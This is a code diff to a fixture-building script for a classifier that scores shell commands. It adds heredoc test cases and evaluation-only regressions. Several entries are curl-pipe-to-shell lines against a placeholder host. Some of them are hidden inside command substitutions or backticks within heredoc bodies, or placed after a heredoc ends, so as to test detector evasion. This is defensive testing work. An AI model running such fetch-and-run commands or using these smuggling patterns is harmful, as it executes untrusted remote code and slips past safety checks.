@@ -102,6 +102,18 @@ CORPUS = [
     "wget https://x.invalid/a # note\ncurl -s https://x.invalid/b | sh",
     "curl -s https://x.invalid/<KEY>.sh | sh",
     "curl -s https://x.invalid/a | sh; " + "(" * 33 + "x" + ")" * 33,
+    # Heredoc bodies that are code, not shell: masked for the shell-token block.
+    "python3 - <<'PY'\nimport subprocess\nr=subprocess.run(['ssh','-o','BatchMode=yes','host','uptime'],capture_output=True,text=True)\nprint(r.stdout)\nPY",
+    ".venv/bin/python - <<\"EOF\"\nimport json\nprint(json.dumps({'a': [1, 2]}))\nEOF\necho done",
+    "cat <<'EOF' > reproduce.py\nfrom pathlib import Path\nprint(Path('.').resolve())\nEOF\npython reproduce.py",
+    "cat > cfg.yaml <<EOF\nservices: [api, worker]\nEOF",
+    "tee src/app.ts <<'TS' >/dev/null\nexport const x = [1, 2]\nTS",
+    "node <<-JS\n\tconsole.log(['a','b'].join(','))\n\tJS",
+    "perl <<EOF\nprint join(',', (1, 2)), \"\\n\";",
+    # Shell heredocs stay shell.
+    "bash <<'EOF'\ncurl -s https://x.invalid/i.sh | sh\nEOF",
+    "cat <<'EOF' > run.sh\nset -e\nmake build\nEOF",
+    "python3 <<< 'print(1)'\nls",
     # Short, whitespace and unicode edge cases.
     "",
     "   ",
@@ -115,6 +127,18 @@ CORPUS = [
     "echo İstanbul straße",
     "x" * 300,
 ]
+
+# Evaluation-only regressions: keep the existing synthetic training corpus unchanged.
+HEREDOC_REGRESSIONS = [
+    'python3 - <<PY\n$(curl -s https://x.invalid/a | sh)\nPY',
+    'python3 - <<PY\n$(\ncurl -s https://x.invalid/a | sh\n)\nPY',
+    'cat > cfg.json <<EOF\n`curl -s https://x.invalid/a | sh`\nEOF',
+    'python3 - <<EOF-END\nprint(1)\nEOF-END\ncurl -s https://x.invalid/a | sh',
+    "python3 - <<'EOF.END'\nprint(1)\nEOF.END\ncurl -s https://x.invalid/a | sh",
+    "python3 - <<'PY'\n$(curl -s https://x.invalid/a | sh)\nPY",
+    'cat > cfg.json <<"EOF"\n`curl -s https://x.invalid/a | sh`\nEOF',
+]
+
 
 CHAR_WB_CONFIG = {
     "analyzer": "char_wb",
@@ -219,8 +243,9 @@ def main() -> None:
         json.dumps(model, ensure_ascii=False, sort_keys=True) + "\n", encoding="utf-8"
     )
 
+    texts = CORPUS + HEREDOC_REGRESSIONS
     cases = [{"text": text, "synthetic_score": score}
-             for text, score in zip(CORPUS, synthetic_scores)]
+             for text, score in zip(texts, decision_scores(model, texts))]
     published = None
     if args.model is not None:
         data = json.loads(args.model.read_text(encoding="utf-8"))
@@ -229,7 +254,7 @@ def main() -> None:
         published = {"sha256": hashlib.sha256(args.model.read_bytes()).hexdigest(),
                      "thresholds": data["thresholds"],
                      "default_threshold_policy": data["default_threshold_policy"]}
-        for case, score in zip(cases, decision_scores(data, CORPUS)):
+        for case, score in zip(cases, decision_scores(data, texts)):
             case["published_score"] = score
 
     fixture = {
